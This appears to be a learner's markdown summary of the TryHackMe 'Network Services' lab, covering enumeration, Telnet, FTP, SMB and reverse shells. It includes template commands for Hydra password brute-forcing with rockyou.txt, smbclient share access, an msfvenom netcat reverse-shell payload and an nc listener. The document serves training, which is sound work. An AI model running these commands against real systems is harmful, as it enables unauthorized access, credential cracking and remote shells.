@@ -1,0 +1,75 @@
+Summary of Learning
+Room_Link : https://tryhackme.com/room/networkservices
+
+During this room, we explored misconfigured network services and how to exploit them. Key takeaways:
+
+1. Enumeration & Port Scanning
+
+Enumeration is crucial to identify vulnerabilities.
+
+Used Nmap to scan the target machine for open ports, including non-standard ports.
+
+Identified services like Telnet, FTP, SMB, and others.
+
+2. Telnet
+
+Telnet allows remote command execution but is insecure, sending all communication in plaintext.
+
+SSH has slowly replaced Telnet due to its encrypted communication.
+
+Syntax to connect:
+telnet [IP] [PORT]
+Weak configurations or backdoors can allow unauthorized access.
+
+Learned about reverse shells using Netcat (nc) for remote access.
+
+3. FTP (File Transfer Protocol)
+
+FTP allows file transfers using a client-server model with separate command and data channels.
+
+Commands and data are sent in plaintext, making FTP insecure if not configured properly.
+
+Exploited weak/default passwords using Hydra:
+hydra -t 4 -l [user] -P /usr/share/wordlists/rockyou.txt -vV [IP] ftp
+
+Learned about active vs passive FTP connections.
+
+4. SMB (Server Message Block)
+
+SMB shares can contain valuable information if misconfigured.
+
+Accessed shares using smbclient:
+smbclient //[IP]/[SHARE] -U [USERNAME]
+
+Useful for downloading sensitive files and enumerating users.
+
+5. Reverse Shells
+
+Generated a Netcat reverse shell payload using msfvenom:
+msfvenom -p cmd/unix/reverse_netcat lhost=[Local IP] lport=[PORT] R
+
+Started a listener on your machine:
+nc -lvnp [PORT]
+
+6. General Exploitation Notes
+
+Always check for misconfigurations first; these are often easier than software vulnerabilities.
+
+Be thorough in enumeration: open ports, available services, shares, and user folders can reveal a lot.
+
+Practice using tools like Nmap, Hydra, smbclient, Netcat, and msfvenom for exploitation.
+
+Key Skills Gained : 
+
+Port scanning and service enumeration
+
+Understanding Telnet and FTP vulnerabilities
+
+Using Hydra for password brute forcing
+
+Accessing SMB shares and downloading files
+
+Generating and using Netcat reverse shells
+
+Overall methodology for exploiting misconfigured network services
+
